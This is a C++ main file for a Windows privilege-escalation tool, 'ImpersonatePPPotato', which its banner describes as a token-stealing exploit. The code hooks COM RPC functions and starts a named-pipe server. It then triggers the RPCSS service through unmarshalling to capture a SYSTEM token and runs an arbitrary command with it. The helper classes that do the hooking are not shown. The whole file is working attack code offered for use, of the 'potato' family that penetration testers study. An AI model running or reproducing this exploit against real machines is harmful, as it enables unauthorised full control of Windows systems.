#include "ImpersonatePPPotatoContext.h"
#include "ImpersonatePPPotatoUnmarshalTrigger.h"
#include <iostream>
#include <string>

void PrintBanner() {
    std::wcout << L"\n";
    std::wcout << L"  ImpersonatePPPotato - Token Stealing Exploit\n";
    std::wcout << L"  COM-based privilege escalation via RPC Hooking\n";
    std::wcout << L"\n";
}

void PrintUsage(const wchar_t* programName) {
    std::wcout << L"Usage: " << programName << L" -c <command> [options]\n";
    std::wcout << L"\n";
    std::wcout << L"Options:\n";
    std::wcout << L"  -c <cmd>    Command to execute with SYSTEM privileges\n";
    std::wcout << L"  -p <name>   Pipe name (default: ImpersonatePPPotato)\n";
    std::wcout << L"  -h          Show this help message\n";
    std::wcout << L"\n";
    std::wcout << L"Example:\n";
    std::wcout << L"  " << programName << L" -c \"cmd /c whoami\"\n";
}


struct Args {
    std::wstring command;
    std::wstring pipeName;
    bool showHelp;

    Args() : pipeName(L"ImpersonatePPPotato"), showHelp(false) {}
};


Args ParseArgs(int argc, wchar_t* argv[]) {
    Args args;

    for (int i = 1; i < argc; i++) {
        std::wstring arg = argv[i];

        if (arg == L"-h" || arg == L"/?" || arg == L"--help") {
            args.showHelp = true;
        }
        else if (arg == L"-c" && i + 1 < argc) {
            args.command = argv[++i];
        }
        else if (arg == L"-p" && i + 1 < argc) {
            args.pipeName = argv[++i];
        }
        else if (arg[0] != L'-') {
            args.command = arg;
        }
    }

    return args;
}

int wmain(int argc, wchar_t* argv[]) {
    PrintBanner();

    Args args = ParseArgs(argc, argv);

    if (args.showHelp || args.command.empty()) {
        PrintUsage(argv[0]);
        return args.showHelp ? 0 : 1;
    }

    std::wcout << L"[*] Command: " << args.command << L"\n";
    std::wcout << L"[*] Pipe name: " << args.pipeName << L"\n";

    std::wcout << L"[*] Creating context...\n";

    ImpersonatePPPotato::ImpersonatePPPotatoContext context(std::wcout, args.pipeName);

    std::wcout << L"[*] CombaseModule: 0x" << std::hex << context.GetCombaseModule() << std::endl;
    std::wcout << L"[*] DispatchTable: 0x" << std::hex << context.GetDispatchTablePtr() << std::endl;
    std::wcout << L"[*] UseProtseqFunction: 0x" << std::hex << context.GetUseProtseqFunctionPtr() << std::endl;
    std::wcout << L"[*] UseProtseqFunctionParamCount: " << std::dec << (int)context.GetUseProtseqFunctionParamCount() << std::endl;

    std::wcout << L"[*] Initializing COM...\n";
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        std::wcerr << L"[!] CoInitializeEx failed: 0x" << std::hex << hr << L"\n";
    }

    std::wcout << L"[*] HookRPC...\n";
    context.HookRPC();

    std::wcout << L"[*] Start PipeServer...\n";
    context.Start();

    std::wcout << L"\n[*] Trigger RPCSS\n";
    ImpersonatePPPotato::ImpersonatePPPotatoUnmarshalTrigger unmarshalTrigger(&context);

    hr = unmarshalTrigger.Trigger();
    std::wcout << L"[*] UnmarshalObject: 0x" << std::hex << hr << std::endl;

    HANDLE hSystemToken = context.GetToken();
    if (hSystemToken) {
        std::wcout << L"[+] Got SYSTEM token!\n";
        std::wcout << L"[*] Executing command: " << args.command << L"\n";

        std::wstring output = L"";
        if (context.CreateProcessWithToken(hSystemToken, args.command.c_str(), &output)) {
            std::wcout << L"[+] Command executed successfully.\n";
            if (!output.empty()) {
                std::wcout << output << L"\n";
            }
        }
        else {
            std::wcerr << L"[-] Failed to execute command. Error: " << GetLastError() << "\n";
        }
    }
    else {
        std::wcerr << L"[!] Failed to acquire SYSTEM token\n";
    }

    context.Restore();
    context.Stop();

    return hSystemToken ? 0 : 1;

}
